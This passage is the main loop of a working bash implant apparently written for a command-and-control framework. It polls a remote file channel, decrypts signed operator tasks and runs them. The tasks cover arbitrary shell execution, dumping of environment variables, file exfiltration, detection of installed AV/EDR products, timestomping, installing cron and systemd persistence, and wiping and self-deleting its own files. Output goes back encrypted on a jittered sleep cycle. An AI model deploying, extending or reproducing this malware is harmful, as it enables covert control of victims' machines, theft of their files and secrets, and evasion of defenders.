    encrypted_input=$(_download "${FOLDER_PATH}${INPUT_FILE}")
    
    if [ "$encrypted_input" = "MZ" ]; then
        log "[INPUT]: No command (MZ marker)"
        unset encrypted_input
        log "[SLEEP]: Waiting ${sleep_time}s"
        sleep "$sleep_time"
        log "=== CYCLE END ==="
        continue
    fi

    # === COMMAND DECRYPTION — AES-256-GCM + RSA-PSS-SHA256 verify (server→agent) ===
    log "[INPUT]: Encrypted command received: ${encrypted_input:0:50}..."
    log "[INPUT]: Decrypting (GCM+PSS+session_key)..."

    # Decrypt command — AES-256-GCM + RSA-PSS-SHA256 signature verify (server→agent)
    # Payload: base64(GCM(session_key,aes_key)):base64(nonce||ct||tag):base64(PSS_sig_over_wrapped||blob)
    # PSS is verified first; then session_key GCM-unwraps aes_key; then aes_key GCM-decrypts command.
    command_to_run=$(python3 -c "
import sys, base64
from cryptography.hazmat.primitives.asymmetric import padding as _p
from cryptography.hazmat.primitives import hashes as _h
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
_pss = _p.PSS(mgf=_p.MGF1(_h.SHA256()), salt_length=_p.PSS.MAX_LENGTH)
raw = sys.stdin.read().strip()
wrapped_b64, blob_b64, sig_b64 = raw.split(':', 2)
wrapped = base64.b64decode(wrapped_b64)
blob    = base64.b64decode(blob_b64)
sig     = base64.b64decode(sig_b64)
pub     = load_pem_public_key('''$PUBLIC_KEY'''.encode())
pub.verify(sig, wrapped + blob, _pss, _h.SHA256())
sk  = bytes.fromhex('$SESSION_KEY')
k   = AESGCM(sk).decrypt(wrapped[:12], wrapped[12:], None)
print(AESGCM(k).decrypt(blob[:12], blob[12:], None).decode(), end='')
" <<< "$encrypted_input" 2>/dev/null)

    unset encrypted_input

    if [ -z "$command_to_run" ]; then
        log "[INPUT]: [X] ERROR decrypt/verify failed (GCM auth or PSS sig invalid)"
        # Signal key mismatch to controller via heartbeat file — always encrypted
        _km_ts=$(date +%s)
        _km_payload="KM:${_km_ts}"
        _km_enc=$(python3 -c "
import sys, os, base64
from cryptography.hazmat.primitives.asymmetric import padding as _p
from cryptography.hazmat.primitives import hashes as _h
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
_oaep = _p.OAEP(mgf=_p.MGF1(_h.SHA256()), algorithm=_h.SHA256(), label=None)
pub  = load_pem_public_key('''$PUBLIC_KEY'''.encode())
data = sys.stdin.buffer.read()
k = os.urandom(32); n = os.urandom(12)
blob    = n + AESGCM(k).encrypt(n, data, None)
wrapped = pub.encrypt(k, _oaep)
print(base64.b64encode(wrapped).decode() + ':' + base64.b64encode(blob).decode(), end='')
" <<< "$_km_payload" 2>/dev/null)
        if [ -n "$_km_enc" ]; then
            echo -n "$_km_enc" | _upload "${FOLDER_PATH}${HEARTBEAT_FILE}" >/dev/null 2>&1
        fi
        unset _km_ts _km_payload _km_enc
        # Clear the undecryptable task so it is not re-read on every cycle.
        echo -n "MZ" | _upload "${FOLDER_PATH}${INPUT_FILE}" >/dev/null 2>&1
        sleep "$sleep_time"
        continue
    fi
    
    log "[INPUT]: [OK] Command decrypted"

    # Parse JSON task envelope {"id","type","args","expires_at","session_token"}
    _cmd_id=$(_task_field "$command_to_run" "id")
    _task_type=$(_task_field "$command_to_run" "type")
    _task_token=$(_task_field "$command_to_run" "session_token")
    if [ -z "$_cmd_id" ] || [ -z "$_task_type" ]; then
        log "[INPUT]: [X] JSON parse failed or missing fields"
        unset command_to_run aes_key aes_iv _cmd_id _task_type _task_token
        sleep "$sleep_time"
        continue
    fi

    # expires_at is mandatory — reject tasks missing the field
    _expires=$(_task_field "$command_to_run" "expires_at")
    if [ -z "$_expires" ]; then
        log "[INPUT]: [X] Task missing expires_at — discarding"
        echo -n "MZ" | _upload "${FOLDER_PATH}${INPUT_FILE}" >/dev/null 2>&1
        unset command_to_run _cmd_id _task_type _expires
        sleep "$sleep_time"
        continue
    fi
    _expires_int="${_expires%.*}"   # truncate float to integer for shell arithmetic
    _now=$(date +%s 2>/dev/null || printf '%s' "0")
    if [ "$_now" -gt 0 ] 2>/dev/null && [ "$_now" -gt "${_expires_int:-0}" ] 2>/dev/null; then
        log "[INPUT]: [X] Task expired (expires_at=${_expires}, now=${_now}) — discarding"
        echo -n "MZ" | _upload "${FOLDER_PATH}${INPUT_FILE}" >/dev/null 2>&1
        unset command_to_run _cmd_id _task_type _expires _expires_int _now
        sleep "$sleep_time"
        continue
    fi
    unset _expires _expires_int _now

    # Response state variables — set by each handler
    _status="ok"
    _output=""
    _new_cwd=""
    _staging_path=""
    _artifacts_json="[]"

    # === CHECK IF EXIT (stop execution only — files untouched) ===
    if [ "$_task_type" = "exit" ]; then
        log "[INPUT]: EXIT command received — terminating"
        echo -n "MZ" | _upload "${FOLDER_PATH}${INPUT_FILE}" >/dev/null 2>&1
        log "[INPUT]: Channel cleared (MZ)"
        exit 0
    fi

    # === CHECK IF KILL (full cleanup: blob + persist + self-delete stub) ===
    if [ "$_task_type" = "kill" ]; then
        log "[KILL]: Full cleanup initiated..."
        if [ -n "$_BLOB_PATH" ] && [ -f "$_BLOB_PATH" ]; then
            _sz=$(stat -c%s "$_BLOB_PATH" 2>/dev/null || printf '4096')
            dd if=/dev/urandom of="$_BLOB_PATH" bs=1 count="$_sz" 2>/dev/null
            rm -f "$_BLOB_PATH" 2>/dev/null
            log "[KILL]: blob wiped"
        fi
        _persist_remove_all
        log "[KILL]: persistence removed"
        if [ -n "$STUB_PATH" ] && [ -f "$STUB_PATH" ]; then
            (sleep 1; rm -f "$STUB_PATH") &
            log "[KILL]: stub self-delete scheduled"
        fi
        echo -n "MZ" | _upload "${FOLDER_PATH}${INPUT_FILE}" >/dev/null 2>&1
        log "[INPUT]: Channel cleared (MZ)"
        exit 0
    fi

    # === DISPATCH ===
    case "$_task_type" in

        sysinfo)
            log "[SYSINFO]: Gathering system info..."
            _info="=== SYSTEM INFO ===\n"
            _info="${_info}Hostname:     $(hostname)\n"
            _info="${_info}OS:           $(uname -s -r -m)\n"
            _info="${_info}Distro:       $(grep '^PRETTY_NAME' /etc/os-release 2>/dev/null | cut -d= -f2 | tr -d '"')\n"
            _info="${_info}Kernel:       $(uname -r)\n"
            _info="${_info}User:         $(whoami)\n"
            _info="${_info}UID:          $(id -u)\n"
            _info="${_info}Groups:       $(id -Gn 2>/dev/null | tr ' ' ',')\n"
            _info="${_info}PID:          $$\n"
            _info="${_info}PPID:         $PPID\n"
            _info="${_info}CWD:          $(pwd)\n"
            _info="${_info}Shell:        $SHELL\n"
            _info="${_info}Uptime:       $(uptime -p 2>/dev/null || uptime)\n"
            _info="${_info}\n=== HARDWARE ===\n"
            _info="${_info}CPU:          $(nproc 2>/dev/null || sysctl -n hw.ncpu 2>/dev/null) cores\n"
            _info="${_info}RAM:          $(free -h 2>/dev/null | awk '/^Mem:/{print $2}' || sysctl -n hw.memsize 2>/dev/null)\n"
            _info="${_info}\n=== NETWORK ===\n"
            _ifaces=$(ip --brief addr 2>/dev/null || ip addr show 2>/dev/null)
            if [ -n "$_ifaces" ]; then
                if ip --brief addr >/dev/null 2>&1; then
                    _info="${_info}$(ip --brief addr 2>/dev/null | awk '{iface=$1; $1=""; $2=""; gsub(/^ +/,"",$0); if($0=="") $0="(no address)"; printf "  %s: %s\n", iface, $0}')\n"
                else
                    _info="${_info}$(ip addr show 2>/dev/null | awk '/^[0-9]/{iface=$2; sub(/:$/,"",iface)} /inet /{printf "  %s: %s\n", iface, $2}')\n"
                fi
            else
                _info="${_info}$(ifconfig 2>/dev/null | awk '/^[a-z]/{iface=$1} /inet /{printf "  %s: %s\n", iface, $2}')\n"
            fi
            _info="${_info}\n=== AV/EDR ===\n"
            _edr=""
            for _proc in osqueryd auditd falco wazuh ossec crowdstrike sentinelone carbonblack cortex elastic-agent filebeat auditbeat; do
                pgrep -x "$_proc" >/dev/null 2>&1 && _edr="$_edr $_proc"
            done
            for _path in /opt/osquery /opt/wazuh /opt/falco /var/ossec /opt/CrowdStrike /opt/SentinelOne /opt/carbonblack /.fleet; do
                [ -e "$_path" ] && _edr="$_edr $_path"
            done
            _edr=$(printf '%s' "$_edr" | tr ' ' '\n' | grep -v '^$' | tr '\n' ',' | sed 's/,$//;s/^,//')
            _info="${_info}  ${_edr:-None detected}\n"
            _info="${_info}\n=== FIREWALL ===\n"
            _fw=""
            iptables -L -n >/dev/null 2>&1 && _fw="iptables: $(iptables -L -n 2>/dev/null | grep -c '^[A-Z]') chains"
            ufw status 2>/dev/null | grep -qi active && _fw="$_fw ufw: active"
            firewall-cmd --state 2>/dev/null | grep -qi running && _fw="$_fw firewalld: running"
            _info="${_info}  ${_fw:-None active}\n"
            _info="${_info}\n=== CONTAINER ===\n"
            _ct=""
            [ -f /.dockerenv ] && _ct="Running in Docker"
            [ -f /run/.containerenv ] && _ct="Running in Podman"
            [ -S /var/run/docker.sock ] && [ -z "$_ct" ] && _ct="Docker available"
            [ -S /run/podman/podman.sock ] && [ -z "$_ct" ] && _ct="${_ct:+$_ct, }Podman available"
            [ -d /var/lib/lxc ] && _ct="${_ct:+$_ct, }LXC available"
            _info="${_info}  ${_ct:-None}\n"
            _info="${_info}\n=== NET TOOLS ===\n"
            _tools=""
            for _t in netstat ss nc nmap tcpdump curl wget; do
                command -v "$_t" >/dev/null 2>&1 && _tools="$_tools $_t"
            done
            _tools=$(printf '%s' "$_tools" | tr ' ' '\n' | grep -v '^$' | tr '\n' ',' | sed 's/,$//;s/^,//')
            _info="${_info}  ${_tools:-None}\n"
            _output=$(printf '%b' "$_info")
            unset _info _ifaces _edr _proc _path _fw _ct _tools _t
            ;;

        env)
            log "[ENV]: Gathering environment variables..."
            _output=$(env | sort)
            ;;

        download)
            _upload_file_path=$(_task_arg "$command_to_run" "target_path")
            log "[DOWNLOAD]: Reading file: $_upload_file_path"
            if [ ! -f "$_upload_file_path" ]; then
                _output="ERROR: File not found: $_upload_file_path"; _status="error"
            else
                _file_name=$(basename "$_upload_file_path")
                _staging_dest="${STAGING_PATH}/ul_${_file_name}"
                _file_size=$(stat -c%s "$_upload_file_path" 2>/dev/null || stat -f%z "$_upload_file_path" 2>/dev/null)
                log "[DOWNLOAD]: Staging ${_file_size} bytes..."
                if _upload_file "$_staging_dest" "$_upload_file_path"; then
                    _staging_path="$_staging_dest"
                    _output="staged $_file_name (${_file_size} bytes)"
                    log "[DOWNLOAD]: [OK] staged at $_staging_dest"
                else
                    _output="ERROR: Failed to stage file"; _status="error"
                fi
            fi
            unset _upload_file_path _file_name _staging_dest _file_size
            ;;

        exfil)
            _exfil_pattern=$(_task_arg "$command_to_run" "pattern")
            log "[EXFIL]: Pattern=$_exfil_pattern"
            case "$_exfil_pattern" in
                *'$('*|*'`'*|*';'*|*'|'*)
                    log "[EXFIL]: [X] Pattern rejected: forbidden characters"
                    _output="ERROR: invalid pattern"; _status="error"
                    ;;
                *)
                    _exfil_results=""
                    _exfil_count=0
                    for _exfil_f in $_exfil_pattern; do
                        [ -f "$_exfil_f" ] 2>/dev/null || continue
                        _exfil_name=$(basename "$_exfil_f")
                        _exfil_dest="${STAGING_PATH}/exfil_${_exfil_name}"
                        if _upload_file "$_exfil_dest" "$_exfil_f"; then
                            _exfil_results="${_exfil_results}OK: ${_exfil_f} → ${_exfil_dest}\n"
                            _exfil_count=$((_exfil_count + 1))
                        else
                            _exfil_results="${_exfil_results}FAIL: ${_exfil_f}\n"
                        fi
                    done
                    if [ "$_exfil_count" -eq 0 ] && [ -z "$_exfil_results" ]; then
                        _output="ERROR: no files matched '${_exfil_pattern}'"; _status="error"
                    else
                        _output=$(printf '%b' "$_exfil_results")
                    fi
                    unset _exfil_f _exfil_name _exfil_dest _exfil_results _exfil_count
                    ;;
            esac
            unset _exfil_pattern
            ;;

        upload)
            _staging_src=$(_task_arg "$command_to_run" "staging_path")
            _file_name=$(_task_arg "$command_to_run" "filename")
            _dest_path=$(_task_arg "$command_to_run" "dest_path")
            log "[UPLOAD]: Writing $_file_name to disk..."
            if [ -n "$_dest_path" ]; then
                case "$_dest_path" in
                    /*) _save_path="$_dest_path" ;;
                    *)  _save_path="$(pwd)/$_dest_path" ;;
                esac
                [ -d "$_save_path" ] && _save_path="${_save_path%/}/$_file_name"
                mkdir -p "$(dirname "$_save_path")" 2>/dev/null
            else
                _save_path="$(pwd)/$_file_name"
            fi
            _download "$_staging_src" > "$_save_path"
            if [ -s "$_save_path" ]; then
                _dl_size=$(stat -c%s "$_save_path" 2>/dev/null || stat -f%z "$_save_path" 2>/dev/null)
                _output="OK: Saved $_file_name ($_dl_size bytes) to $_save_path"
                log "[UPLOAD]: [OK] $_output"
            else
                _output="ERROR: Staging file returned empty"; _status="error"
            fi
            unset _staging_src _file_name _dest_path _save_path _dl_size
            ;;

        sleep)
            _new_sleep=$(_task_arg "$command_to_run" "seconds")
            if [ "$_new_sleep" -ge 1 ] 2>/dev/null; then
                _old_sleep=$BASE_SLEEP
                BASE_SLEEP=$_new_sleep
                JITTER=$((BASE_SLEEP * JITTER_PERCENT / 100))
                _output="OK: Sleep changed from ${_old_sleep}s to ${BASE_SLEEP}s (jitter: ${JITTER_PERCENT}%)"
                log "[CONFIG]: $_output"
            else
                _output="ERROR: Invalid sleep value (must be >= 1)"; _status="error"
            fi
            unset _new_sleep _old_sleep
            ;;

        jitter)
            _new_jitter=$(_task_arg "$command_to_run" "percent")
            if [ "$_new_jitter" -ge 0 ] 2>/dev/null && [ "$_new_jitter" -le 50 ]; then
                _old_jitter=$JITTER_PERCENT
                JITTER_PERCENT=$_new_jitter
                JITTER=$((BASE_SLEEP * JITTER_PERCENT / 100))
                _output="OK: Jitter changed from ${_old_jitter}% to ${JITTER_PERCENT}% (sleep: ${BASE_SLEEP}s)"
                log "[CONFIG]: $_output"
            else
                _output="ERROR: Invalid jitter value (must be 0-50)"; _status="error"
            fi
            unset _new_jitter _old_jitter
            ;;

        timestomp)
            _ts_target=$(_task_arg "$command_to_run" "target")
            _ts_ref=$(_task_arg "$command_to_run" "reference")
            log "[TIMESTOMP]: Target=$_ts_target Ref=$_ts_ref"
            if [ ! -f "$_ts_target" ]; then
                _output="ERROR: Target file not found: $_ts_target"; _status="error"
            elif [ ! -f "$_ts_ref" ]; then
                _output="ERROR: Reference file not found: $_ts_ref"; _status="error"
            else
                touch -r "$_ts_ref" "$_ts_target" 2>/dev/null
                if [ $? -eq 0 ]; then
                    _ref_mtime=$(stat -c '%y' "$_ts_ref" 2>/dev/null || stat -f '%Sm' "$_ts_ref" 2>/dev/null)
                    _output="OK: Timestamps copied from $_ts_ref to $_ts_target (mtime: $_ref_mtime)"
                    log "[TIMESTOMP]: [OK] $_output"
                else
                    _output="ERROR: touch -r failed"; _status="error"
                fi
            fi
            unset _ts_target _ts_ref _ref_mtime
            ;;

        timestomp_set)
            _ts_target=$(_task_arg "$command_to_run" "target")
            _ts_dt=$(_task_arg "$command_to_run" "timestamp")
            log "[TIMESTOMP_SET]: Target=$_ts_target DateTime=$_ts_dt"
            if [ ! -f "$_ts_target" ]; then
                _output="ERROR: Target file not found: $_ts_target"; _status="error"
            else
                touch -d "$_ts_dt" "$_ts_target" 2>/dev/null
                if [ $? -eq 0 ]; then
                    _output="OK: Timestamps set on $_ts_target to $_ts_dt"
                    log "[TIMESTOMP_SET]: [OK] $_output"
                else
                    _output="ERROR: touch -d failed (invalid date format?)"; _status="error"
                fi
            fi
            unset _ts_target _ts_dt
            ;;

        persist_probe)
            _ptech=$(_task_arg "$command_to_run" "technique")
            if [ -z "$_ptech" ]; then
                log "[PERSIST_PROBE]: Probing all techniques..."
                _output=$(_persist_probe_all)
            else
                log "[PERSIST_PROBE]: Probing selected: $_ptech"
                _psel_r=""
                for _psel_t in $(printf '%s' "$_ptech" | tr ',' '\n'); do
                    case "$_psel_t" in
                        cron-reboot)    _psel_r="${_psel_r}$(_probe_cron_reboot)${_NL}" ;;
                        systemd-user)   _psel_r="${_psel_r}$(_probe_systemd_user)${_NL}" ;;
                        systemd-system) _psel_r="${_psel_r}$(_probe_systemd_system)${_NL}" ;;
                        rc-local)       _psel_r="${_psel_r}$(_probe_rc_local)${_NL}" ;;
                        cron-system)    _psel_r="${_psel_r}$(_probe_cron_system)${_NL}" ;;
                    esac
                done
                _output="PERSIST_PROBE_RESULT${_NL}${_psel_r}"
                unset _psel_t _psel_r
            fi
            unset _ptech
            ;;

        persist_install)
            _pid=$(_task_arg "$command_to_run" "technique")
            log "[PERSIST_INSTALL]: technique=$_pid"
            case "$_pid" in
                cron-reboot)    _raw_out=$(_install_cron_reboot) ;;
                systemd-user)   _raw_out=$(_install_systemd_user) ;;
                systemd-system) _raw_out=$(_install_systemd_system) ;;
                rc-local)       _raw_out=$(_install_rc_local) ;;
                cron-system)    _raw_out=$(_install_cron_system) ;;
                *) _raw_out="ERROR: Unknown persistence technique '$_pid'" ;;
            esac
            _parsed=$(_extract_artifacts "$_raw_out")
            _output="${_parsed%%$'\x01'*}"
            _artifacts_json="${_parsed##*$'\x01'}"
            case "$_output" in ERROR:*) _status="error" ;; esac
            unset _pid _raw_out _parsed
            ;;

        persist_remove)
            _pid=$(_task_arg "$command_to_run" "technique")
            log "[PERSIST_REMOVE]: technique=$_pid"
            case "$_pid" in
                cron-reboot)    _raw_out=$(_remove_cron_reboot) ;;
                systemd-user)   _raw_out=$(_remove_systemd_user) ;;
                systemd-system) _raw_out=$(_remove_systemd_system) ;;
                rc-local)       _raw_out=$(_remove_rc_local) ;;
                cron-system)    _raw_out=$(_remove_cron_system) ;;
                *) _raw_out="ERROR: Unknown persistence technique '$_pid'" ;;
            esac
            _parsed=$(_extract_artifacts "$_raw_out")
            _output="${_parsed%%$'\x01'*}"
            _artifacts_json="${_parsed##*$'\x01'}"
            case "$_output" in ERROR:*) _status="error" ;; esac
            unset _pid _raw_out _parsed
            ;;

        persist_status)
            _pid=$(_task_arg "$command_to_run" "technique")
            log "[PERSIST_STATUS]: technique=$_pid"
            case "$_pid" in
                cron-reboot)    _output=$(_status_cron_reboot) ;;
                systemd-user)   _output=$(_status_systemd_user) ;;
                systemd-system) _output=$(_status_systemd_system) ;;
                rc-local)       _output=$(_status_rc_local) ;;
                cron-system)    _output=$(_status_cron_system) ;;
                *) _output="ERROR: Unknown persistence technique '$_pid'"; _status="error" ;;
            esac
            case "$_output" in ERROR:*) _status="error" ;; esac
            unset _pid
            ;;

        persist_action)
            _pa=$(_task_arg "$command_to_run" "action")
            log "[PERSIST]: Shorthand dispatch → cron-reboot (action=$_pa)"
            case "$_pa" in
                install)
                    _output=$(_install_cron_reboot) ;;
                install-and-cleanup)
                    _output=$(_install_cron_reboot)
                    _cleanup_src="${STUB_PATH:-$0}"
                    if [ -n "$_cleanup_src" ] && [ -f "$_cleanup_src" ]; then
                        rm -f "$_cleanup_src" 2>/dev/null && \
                            _output="${_output}${_NL}  Original deleted: ${_cleanup_src}" || \
                            _output="${_output}${_NL}  WARN: Could not delete original: ${_cleanup_src}"
                    fi ;;
                remove) _output=$(_remove_cron_reboot) ;;
                check)  _output=$(_status_cron_reboot) ;;
                *) _output="ERROR: Unknown persist action '$_pa'"; _status="error" ;;
            esac
            case "$_output" in ERROR:*) _status="error" ;; esac
            unset _pa _cleanup_src
            ;;

        shell)
            _req_cwd=$(_task_arg "$command_to_run" "cwd")
            _cmd_str=$(_task_arg "$command_to_run" "cmd")
            if [ -n "$_req_cwd" ]; then
                if cd "$_req_cwd" 2>/dev/null; then
                    OPERATOR_CWD="$_req_cwd"
                else
                    _output="[WARN: cd '$_req_cwd' failed — running from $(pwd)]
"
                fi
            fi

            # Native cd handling — subprocess cd doesn't affect our process
            _bare_cd=""
            case "$_cmd_str" in
                cd)       _bare_cd="$HOME" ;;
                cd\ *|cd	*)
                    # Only if no pipes, chains, or semicolons
                    case "$_cmd_str" in
                        *\&\&*|*\|\|*|*\;*|*\|*) ;;
                        *) _bare_cd="${_cmd_str#cd }" ; _bare_cd="${_bare_cd#cd	}" ;;
                    esac
                    ;;
            esac

            if [ -n "$_bare_cd" ]; then
                # Expand ~ prefix
                case "$_bare_cd" in
                    "~")   _bare_cd="$HOME" ;;
                    "~/"*) _bare_cd="$HOME/${_bare_cd#\~/}" ;;
                esac
                if cd "$_bare_cd" 2>/dev/null; then
                    _new_cwd=$(pwd)
                    OPERATOR_CWD="$_new_cwd"
                    _output="[exit code: 0]"
                else
                    _output="cd: no such file or directory: $_bare_cd"
                    _status="error"
                    _new_cwd=$(pwd)
                fi
            else
                log "[EXEC]: Executing command..."
                _output="${_output}$(timeout "${MAX_EXEC_TIME:-300}" bash -c "$_cmd_str" 2>&1)"
                _exit_code=$?
                _new_cwd=$(pwd)
                OPERATOR_CWD="$_new_cwd"
                [ $_exit_code -ne 0 ] && _status="error"
            fi
            log "[EXEC]: Output (${#_output} bytes), CWD=$_new_cwd, exit=${_exit_code:-0}"
            [ "${VERBOSE_MODE:-0}" -eq 1 ] && printf '%s\n' "$_output"
            unset _req_cwd _cmd_str _exit_code _bare_cd
            ;;

        *)
            _output="ERROR: unknown task type '$_task_type'"; _status="error"
            log "[INPUT]: [X] $_output"
            ;;

    esac

    unset command_to_run aes_key aes_iv

    # === BUILD JSON RESPONSE ===
    _response=$(_json_response "$_cmd_id" "$_task_type" "$_status" "$_output" "$_new_cwd" "$_staging_path" "$_artifacts_json" "$_task_token")
    unset _cmd_id _task_type _status _output _new_cwd _staging_path _artifacts_json _task_token

    # === OUTPUT ENCRYPTION — RSA-OAEP-SHA256 + AES-256-GCM (agente→server) ===
    log ""
    log "[OUTPUT]: Encrypting output (OAEP+GCM)..."

    encrypted_result=$(python3 -c "
import sys, os, base64
from cryptography.hazmat.primitives.asymmetric import padding as _p
from cryptography.hazmat.primitives import hashes as _h
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
_oaep = _p.OAEP(mgf=_p.MGF1(_h.SHA256()), algorithm=_h.SHA256(), label=None)
pub  = load_pem_public_key('''$PUBLIC_KEY'''.encode())
data = sys.stdin.buffer.read()
k = os.urandom(32); n = os.urandom(12)
blob    = n + AESGCM(k).encrypt(n, data, None)
wrapped = pub.encrypt(k, _oaep)
print(base64.b64encode(wrapped).decode() + ':' + base64.b64encode(blob).decode(), end='')
" <<< "$_response" 2>/dev/null)
    unset _response

    if [ -z "$encrypted_result" ]; then
        log "[OUTPUT]: [X] Encryption ERROR"
        encrypted_result=$(printf '%s' "[ERROR_ENCRYPTION]" | base64 -w 0)
    else
        log "[OUTPUT]: [OK] Output encrypted (${#encrypted_result} bytes)"
    fi
    
    # === UPLOAD ENCRYPTED OUTPUT ===
    log "[OUTPUT]: Uploading encrypted output..."
    
    echo -n "$encrypted_result" | _upload "${FOLDER_PATH}${OUTPUT_FILE}"
    
    log "[OUTPUT]: [OK] File updated"
    
    unset encrypted_result
    
    # === CLEAN INPUT FILE ===
    log "[INPUT]: Cleaning input file..."
    
    echo -n "MZ" | _upload "${FOLDER_PATH}${INPUT_FILE}"
    
    log "[INPUT]: [OK] File cleaned (MZ)"
    
    # === SLEEP WITH JITTER (recalculate so SLEEP/JITTER commands take effect immediately) ===
    _rnd=$(od -An -N2 -tu2 /dev/urandom | tr -d ' ')
    sleep_time=$(( BASE_SLEEP - JITTER + (_rnd % (JITTER * 2 + 1)) ))
    [ "$sleep_time" -lt 5 ] && sleep_time=5
    log ""
    log "[SLEEP]: Waiting ${sleep_time}s"
    sleep "$sleep_time"
    log "=== CYCLE END ==="
done
